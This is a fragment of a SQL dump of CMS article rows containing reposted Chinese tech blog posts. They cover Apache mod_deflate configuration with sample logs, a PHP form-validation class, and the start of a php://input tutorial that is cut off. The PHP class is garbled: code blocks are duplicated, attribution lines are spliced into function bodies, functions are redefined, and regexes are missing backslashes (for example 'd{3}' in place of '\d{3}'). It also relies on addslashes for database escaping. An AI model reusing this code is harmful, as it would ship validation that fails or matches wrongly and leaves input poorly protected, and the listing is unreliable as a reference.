/&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# NOTE: Due to a bug in mod_setenvif up to Apache 2.0.48&lt;/li&gt;\r\n&lt;li&gt;# the above regex won''t work. You can use the following&lt;/li&gt;\r\n&lt;li&gt;# workaround to get the desired effect:&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch \\bMSI[E] !no-gzip !gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Don''t compress images&lt;/li&gt;\r\n&lt;li&gt;SetEnvIfNoCase Request_URI \\.(?:gif|jpg|cab|jpe?g|exe|bmp|mp3|rar|zip|swf|png)$ no-gzip dont-vary&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Make sure proxies don''t deliver the wrong content&lt;/li&gt;\r\n&lt;li&gt;Header append Vary User-Agent env=!dont-vary&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;二、日志输出格式如下&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;[root@trffic2 logs]# tail -f access_log&lt;/li&gt;\r\n&lt;li&gt;&quot;GET /apache_pb.gif HTTP/1.1&quot; -/- (-%)&lt;/li&gt;\r\n&lt;li&gt;&quot;GET /manual/ HTTP/1.1&quot; 2163/7434 (29%)&lt;/li&gt;\r\n&lt;li&gt;&quot;GET /manual/style/css/manual.css HTTP/1.1&quot; 3973/18335 (21%)&lt;/li&gt;\r\n&lt;li&gt;&quot;GET /manual/style/css/manual-loose-100pc.css HTTP/1.1&quot; 1006/2882 (34%)&lt;/li&gt;\r\n&lt;li&gt;&quot;GET /manual/style/css/manual-print.css HTTP/1.1&quot; 2994/13017 (23%)&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;_________________&lt;/p&gt;\r\n&lt;p&gt;apache1.3.x可以用mod_gzip进行优化网页浏览的速度，可以明显的感觉到速度的提升。在apache2中也尝试用mod_gzip，但是配置后确发现网页不能正确显示（空白页），所以改换mod_deflate。&lt;br /&gt;\r\n在Linux命令行下运行以下命令安装mod_deflate模块（斜体是apache2的目录）&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;/usr/local/apache2/bin/apxs -i -c /root/httpd-2.0.48/modules/filters/mod_deflate.c&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;编辑httpd.conf，加入以下内容：&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;LoadModule deflate_module modules/mod_deflate.so&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote ratio&lt;/li&gt;\r\n&lt;li&gt;LogFormat ''&quot;%v %h %l %u %t &quot;%r&quot; %&amp;amp;gt;s %b &quot;%{Referer}i&quot; &quot;%{User-Agent}i&quot;&quot; (%{ratio}n)'' deflate&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Insert filter&lt;/li&gt;\r\n&lt;li&gt;SetOutputFilter DEFLATE&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Netscape 4.x has some problems...&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4 gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Netscape 4.06-4.08 have some more problems&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4.0[678] no-gzip&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# MSIE masquerades as Netscape, but it is fine&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Don''t compress images&lt;/li&gt;\r\n&lt;li&gt;SetEnvIfNoCase Request_URI&lt;/li&gt;\r\n&lt;li&gt;.(?:gif|jpe?g|png)$ no-gzip dont-vary&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Make sure proxies don''t deliver the wrong content&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Header命令不对？注释这一行&lt;/li&gt;\r\n&lt;li&gt;# Header append Vary User-Agent env=!dont-vary&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;#查找Customlog 注释原来的的一行，改成&lt;/li&gt;\r\n&lt;li&gt;CustomLog logs/deflate_log deflate&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;#查看logs目录下deflate_log文件，你可以看到许多这样的信息：&lt;/li&gt;\r\n&lt;li&gt;&quot;www.21php.com 220.163.107.88 - - [27/Mar/2004:01:03:55 -0800] &quot;GET /ad/usrlogo/21PHPLOGO_88X31.gif HTTP/1.1&quot; 200 3656 &quot;http://soft.ttee.com/vbb/&quot; &quot;Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)&quot;&quot; (-)&lt;/li&gt;\r\n&lt;li&gt;&quot;www.21php.com 211.144.88.138 - - [27/Mar/2004:01:03:57 -0800] &quot;GET /tutorial/tutorial.php?tid=68 HTTP/1.1&quot; 200 5173 &quot;http://www.21php.com/tutorial/tutorial.php?catalogid=12&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.0.3705; Alexa Toolbar)&quot;&quot; (29)&lt;/li&gt;\r\n&lt;li&gt;&quot;www.21php.com 211.144.88.138 - - [27/Mar/2004:01:03:58 -0800] &quot;GET /style.cssHTTP/1.1&quot; 304 - &quot;http://www.21php.com/tutorial/tutorial.php?tid=68&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.0.3705; Alexa Toolbar)&quot;&quot; (-)&lt;/li&gt;\r\n&lt;li&gt;&quot;www.21php.com 211.144.88.138 - - [27/Mar/2004:01:03:58 -0800] &quot;GET /images/bar-4.gif HTTP/1.1&quot; 304 - &quot;http://www.21php.com/tutorial/tutorial.php?tid=68&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.0.3705; Alexa Toolbar)&quot;&quot; (-)&lt;/li&gt;\r\n&lt;li&gt;&quot;www.21php.com 211.144.88.138 - - [27/Mar/2004:01:03:58 -0800] &quot;GET /images/logo.gif HTTP/1.1&quot; 304 - &quot;http://www.21php.com/tutorial/tutorial.php?tid=68&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.0.3705; Alexa Toolbar)&quot;&quot; (-)&lt;/li&gt;\r\n&lt;li&gt;&quot;www.21php.com 211.144.88.138 - - [27/Mar/2004:01:03:58 -0800] &quot;GET /images/icon1.gif HTTP/1.1&quot; 304 - &quot;http://www.21php.com/tutorial/tutorial.php?tid=68&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.0.3705; Alexa Toolbar)&quot;&quot; (-)&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;Boban  写于2004年3月27日凌晨&lt;/p&gt;\r\n&lt;p&gt;附注：关于mod_deflate的详细内容，可以参考http://httpd.apache.org/docs-2.0/mod/mod_deflate.html&lt;br /&gt;\r\n__________________&lt;/p&gt;\r\n&lt;p&gt;如果apache是rpm安装的，那么默认就已经有mod_deflate这个模块了。&lt;br /&gt;\r\n更详细的可以看这里：http://sysoev.ru/mod_deflate/readme.html&lt;/p&gt;\r\n&lt;p&gt;因为mod_deflate相比较mod_gzip来说，有了更多的更新，所以我用上了它！&lt;br /&gt;\r\n注意：mod_gzip在apache1.x上用起来比较好，但是在apache2.x上用起来就不是很爽，老出错，也许是我的水平问题，没办法，所以改用：mod_deflate &lt;img class=&quot;wp-smiley&quot; alt=&quot;:)&quot; src=&quot;http://blog.penner.cn/wp-includes/images/smilies/icon_smile.gif&quot; /&gt;&lt;/p&gt;\r\n&lt;p&gt;我的apache：2.0.55&lt;br /&gt;\r\n配置如下：（修改：httpd.conf）&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;DeflateCompressionLevel 9&lt;/li&gt;\r\n&lt;li&gt;AddOutputFilterByType DEFLATE text/html text/plain text/xml&lt;/li&gt;\r\n&lt;li&gt;application/x-httpd-php&lt;/li&gt;\r\n&lt;li&gt;AddOutputFilter DEFLATE js css&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4 gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4\\.0[678] no-gzip&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch \\bMSI[E] !no-gzip !gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt;Header append Vary User-Agent env=!dont-vary&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote deflate_ratioLogFormat “%v %h %l %u %t \\”%r\\” %&amp;amp;gt;s %b mod_deflate: %{deflate_ratio}n pct.” vhost_with_deflate_infoCustomLog logs/order.7180.com-access_log vhost_with_deflate_info&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;将以上的配置文字加入到：之间即可:)&lt;/p&gt;\r\n&lt;p&gt;以上的做法是压缩一般的网页html、xml、php、css、js等格式文件的输出，虽然会占用一点服务器的资源，不过这个可以减少带宽被占用的情况:)&lt;br /&gt;\r\n这里：DeflateCompressionLevel 9是指压缩程度的等级，从1到9，9是最高级别的。这样做可以压缩到20%的大小，最少也有50%。至于jpg等已经压缩过的文件，就不需要再压缩了。&lt;/p&gt;\r\n&lt;p&gt; &lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1305257124, 1, 'admin'),
(116, 1, 'PHP中的表单验证类', '', '', '&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;&amp;lt;?php &lt;br /&gt;\r\nclass class_post &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n//验证是否为指定长度的字母/数字组合 &lt;br /&gt;\r\nfunction fun_text1($num1,$num2,$str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nReturn (preg_match(&quot;/^[a-zA-Z0-9]{&quot;.$num1.&quot;,&quot;.$num2.&quot;}$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证是否为指定长度数字 &lt;br /&gt;\r\nfunction fun_text2($num1,$num2,$str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn (preg_match(&quot;/^[0-9]{&quot;.$num1.&quot;,&quot;.$num2.&quot;}$/i&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证是否为指定长度汉字 &lt;br /&gt;\r\nfunction fun_font($num1,$num2,$str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n// preg_match(&quot;/^[\\xa0-\\xff]{1,4}$/&quot;, $string); &lt;br /&gt;\r\nreturn (preg_match(&quot;/^([\\x81-\\xfe][\\x40-\\xfe]){&quot;.$num1.&quot;,&quot;.$num2.&quot;}$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证身份证号码 &lt;br /&gt;\r\nfunction fun_status($str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn (preg_match(''/(^([\\d]{15}|[\\d]{18}|[\\d]{17}x)$)/'',$str))?true:false; &lt;br /&gt;\r\n} &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;//验证邮件地址 &lt;br /&gt;\r\nfunction fun_email($str){ &lt;br /&gt;\r\nreturn (preg_match(''/^[_\\.0-9a-z-]+@([0-9a-z][0-9a-z-]+\\.)+[a-z]{2,4}$/'',$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证电话号码 &lt;br /&gt;\r\nfunction fun_phone($str) &lt;br /&gt;\r\n{ &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;转自：网页教学网[www.webjx.com]&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;return (preg_match(&quot;/^(((d{3}))|(d{3}-))?((0d{2,3})|0d{2,3}-)?[1-9]d{6,7}$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证邮编 &lt;br /&gt;\r\nfunction fun_zip($str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn (preg_match(&quot;/^[1-9]d{5}$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证url地址 &lt;br /&gt;\r\nfunction fun_url($str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn (preg_match(&quot;/^http://[A-Za-z0-9]+.[A-Za-z0-9]+[/=?%-&amp;amp;_~`@[]'':+!]*([^&amp;lt;&amp;gt;&quot;&quot;])*$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;// 数据入库 转义 特殊字符 传入值可为字符串 或 一维数组 &lt;br /&gt;\r\nfunction data_join(&amp;amp;$data) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif(get_magic_quotes_gpc() == false) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($data)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($data as $k =&amp;gt; $v) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k] = addslashes($v); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data = addslashes($data); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nReturn $data; return (preg_match(&quot;/^(((d{3}))|(d{3}-))?((0d{2,3})|0d{2,3}-)?[1-9]d{6,7}$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证邮编 &lt;br /&gt;\r\nfunction fun_zip($str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn (preg_match(&quot;/^[1-9]d{5}$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//验证url地址 &lt;br /&gt;\r\nfunction fun_url($str) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn (preg_match(&quot;/^http://[A-Za-z0-9]+.[A-Za-z0-9]+[/=?%-&amp;amp;_~`@[]'':+!]*([^&amp;lt;&amp;gt;&quot;&quot;])*$/&quot;,$str))?true:false; &lt;br /&gt;\r\n} &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;// 数据入库 转义 特殊字符 传入值可为字符串 或 一维数组 &lt;br /&gt;\r\nfunction data_join(&amp;amp;$data) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif(get_magic_quotes_gpc() == false) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($data)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($data as $k =&amp;gt; $v) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k] = addslashes($v); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data = addslashes($data); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nReturn $data; &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font face=&quot;Arial&quot;&gt;} &lt;br /&gt;\r\n转自：网页教学网[www.webjx.com]&lt;br /&gt;\r\n// 数据出库 还原 特殊字符 传入值可为字符串 或 一/二维数组 &lt;br /&gt;\r\nfunction data_revert(&amp;amp;$data) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($data)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($data as $k1 =&amp;gt; $v1) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($v1)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($v1 as $k2 =&amp;gt; $v2) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k1][$k2] = stripslashes($v2); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k1] = stripslashes($v1); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data = stripslashes($data); &lt;br /&gt;\r\n} &lt;br /&gt;\r\nReturn $data; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n转自：网页教学网[www.webjx.com]&lt;br /&gt;\r\n// 数据显示 还原 数据格式 主要用于内容输出 传入值可为字符串 或 一/二维数组 &lt;br /&gt;\r\n// 执行此方法前应先data_revert()，表单内容无须此还原 &lt;br /&gt;\r\nfunction data_show(&amp;amp;$data) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($data)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($data as $k1 =&amp;gt; $v1) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($v1)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($v1 as $k2 =&amp;gt; $v2) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k1][$k2]=nl2br(htmlspecialchars($data[$k1][$k2])); &lt;br /&gt;\r\n$data[$k1][$k2]=str_replace(&quot; &quot;,&quot; &quot;,$data[$k1][$k2]); &lt;br /&gt;\r\n$data[$k1][$k2]=str_replace(&quot; &quot;,&quot;&amp;lt;br&amp;gt; &quot;,$data[$k1][$k2]); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k1]=nl2br(htmlspecialchars($data[$k1])); &lt;br /&gt;\r\n$data[$k1]=str_replace(&quot; &quot;,&quot; &quot;,$data[$k1]); &lt;br /&gt;\r\n$data[$k1]=str_replace(&quot; &quot;,&quot;&amp;lt;br&amp;gt; &quot;,$data[$k1]); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data=nl2br(htmlspecialchars($data)); &lt;br /&gt;\r\n$data=str_replace(&quot; &quot;,&quot; &quot;,$data); &lt;br /&gt;\r\n$data=str_replace(&quot; &quot;,&quot;&amp;lt;br&amp;gt; &quot;,$data); &lt;br /&gt;\r\n} &lt;br /&gt;\r\nReturn $data; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt; if (is_array($data)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($data as $k1 =&amp;gt; $v1) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (is_array($v1)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nforeach ($v1 as $k2 =&amp;gt; $v2) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k1][$k2]=nl2br(htmlspecialchars($data[$k1][$k2])); &lt;br /&gt;\r\n$data[$k1][$k2]=str_replace(&quot; &quot;,&quot; &quot;,$data[$k1][$k2]); &lt;br /&gt;\r\n$data[$k1][$k2]=str_replace(&quot; &quot;,&quot;&amp;lt;br&amp;gt; &quot;,$data[$k1][$k2]); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data[$k1]=nl2br(htmlspecialchars($data[$k1])); &lt;br /&gt;\r\n$data[$k1]=str_replace(&quot; &quot;,&quot; &quot;,$data[$k1]); &lt;br /&gt;\r\n$data[$k1]=str_replace(&quot; &quot;,&quot;&amp;lt;br&amp;gt; &quot;,$data[$k1]); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$data=nl2br(htmlspecialchars($data)); &lt;br /&gt;\r\n$data=str_replace(&quot; &quot;,&quot; &quot;,$data); &lt;br /&gt;\r\n$data=str_replace(&quot; &quot;,&quot;&amp;lt;br&amp;gt; &quot;,$data); &lt;br /&gt;\r\n} &lt;br /&gt;\r\nReturn $data; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt; &lt;/font&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305615931, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(117, 1, 'php://input php技术', '', '', '&lt;div class=&quot;bct fc05 fc11 nbw-blog ztag js-fs2&quot;&gt;&lt;div&gt; php://input(转)&lt;/div&gt;\r\n &lt;div&gt;2010-05-13 19:23&lt;/div&gt;\r\n &lt;div id=&quot;blog_text&quot;&gt;&lt;div&gt; &lt;div&gt; &lt;p&gt;&lt;a href=&quot;http://www.perfgeeks.com/?p=150&quot;&gt;http://www.perfgeeks.com/?p=150&lt;/a&gt;&lt;/p&gt;\r\n &lt;p&gt; &lt;/p&gt;\r\n &lt;p&gt;? &lt;a href=&quot;http://www.perfgeeks.com/?p=139&quot; rel=&quot;prev&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;PHP服务端推送技术Long Polling&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n &lt;/div&gt;\r\n &lt;div&gt;&lt;a href=&quot;http://www.perfgeeks.com/?p=183&quot; rel=&quot;next&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;PHP5 Session 浅析I&lt;/font&gt;&lt;/a&gt; ?&lt;/div&gt;\r\n &lt;/div&gt;\r\n &lt;div&gt; &lt;h2&gt;PHP输入流php://input&lt;/h2&gt;\r\n &lt;div&gt; &lt;p&gt;在使用xml-rpc的时候，server端获取client数据，主要是通过php输入流input，而不是$_POST数组。所以，这里主要探 讨php输入流php://input&lt;/p&gt;\r\n &lt;p&gt;对一&lt;a href=&quot;http://php.net/manual/en/wrappers.php.php&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;php://input&lt;/font&gt;&lt;/a&gt;介绍，PHP官方手册文档有一段话对它进行了很明确地概述。&lt;/p&gt;\r\n &lt;p&gt;“&lt;var&gt;php://input&lt;/var&gt; allows you to read raw POST data. It is a less memory intensive alternative to &lt;var&gt;&lt;a href=&quot;http://www.php.net/manual/en/reserved.variables.httprawpostdata.php&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;$HTTP_RAW_POST_DATA&lt;/font&gt;&lt;/a&gt;&lt;/var&gt; and does not need any special &lt;var&gt;php.ini&lt;/var&gt; directives. &lt;var&gt;php://input&lt;/var&gt; is not available with &lt;em&gt;enctype=”multipart/form-data”&lt;/em&gt;.&lt;br /&gt;\r\n 翻译过来，是这样：&lt;br /&gt;\r\n “php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特 殊的php.ini设置。php://input不能用于enctype=multipart/form-data”&lt;/p&gt;\r\n &lt;p&gt;我们应该怎么去理解这段概述呢?!我把它划分为三部分，逐步去理解。&lt;/p&gt;\r\n &lt;ol&gt;&lt;li&gt;读取POST数据&lt;/li&gt;\r\n&lt;li&gt;不能用于multipart/form-data类型&lt;/li&gt;\r\n&lt;li&gt;php://input VS $HTTP_RAW_POST_DATA&lt;/li&gt;\r\n&lt;/ol&gt;\r\n &lt;h3&gt;读取POST数据&lt;/h3&gt;\r\n &lt;p&gt;PHPer们一定很熟悉$_POST这个内置变量。$_POST与php://input存在哪些关联与区别呢?另外，客户端向服务端交互数据，最 常用的方法除了POST之外，还有GET。既然php://input作为PHP输入流，它能读取GET数据吗？这二个问题正是我们这节需要探讨的主要内 容。&lt;br /&gt;\r\n 经验告诉我们，从测试与观察中总结，会是一个很凑效的方法。这里，我写了几个脚本来帮助我们测试。&lt;/p&gt;\r\n &lt;pre&gt;@file 192.168.0.6:/phpinput_server.php 打印出接收到的数据&lt;br /&gt;\r\n@file 192.168.0.8:/phpinput_post.php 模拟以POST方法提交表单数据&lt;br /&gt;\r\n@file 192.168.0.8:/phpinput_xmlrpc.php 模拟以POST方法发出xmlrpc请求.&lt;br /&gt;\r\n@file 192.168.0.8:/phpinput_get.php 模拟以GET方法提交表单表数&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;phpinput_server.php与phpinput_post.php&lt;/strong&gt;&lt;/p&gt;\r\n &lt;pre&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;?php&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#808080&quot;&gt;//@file phpinput_server.php&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$raw_post_data&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/file_get_contents&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;file_get_contents&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''php://input''&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;''r''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;-------&lt;span&gt;\\$&lt;/span&gt;_POST------------------&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;a href=&quot;http://www.php.net/var_dump&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;var_dump&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$_POST&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;-------php://input-------------&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;$raw_post_data&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;?&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;br /&gt;\r\n&lt;span&gt;&lt;strong&gt;&amp;lt;?php&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#808080&quot;&gt;//@file phpinput_post.php&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$http_entity_body&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''n=''&lt;/span&gt; 